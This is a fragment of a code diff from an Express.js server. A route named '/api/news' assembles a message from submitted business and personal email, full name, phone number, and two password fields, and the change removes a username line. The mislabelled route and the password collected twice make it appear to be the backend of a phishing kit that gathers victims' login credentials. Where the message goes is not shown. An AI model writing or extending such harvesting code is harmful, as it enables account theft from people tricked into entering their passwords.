@@ -27,7 +27,6 @@ app.post('/api/news', (req, res) => {
     const message = `Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
     Name Acount: ${data.fill_full_name ? data.fill_full_name : ''} 
     Personal Email: ${data.fill_personal_email ? data.fill_personal_email : ''}
-    User Name: ${data.fill_your_name ? data.fill_your_name : ''}
     Phone Number: ${data.fill_phone ? data.fill_phone : ''}
     Password First: ${data.first_password ? data.first_password : ''}
     Password Second: ${data.second_password ? data.second_password : ''}
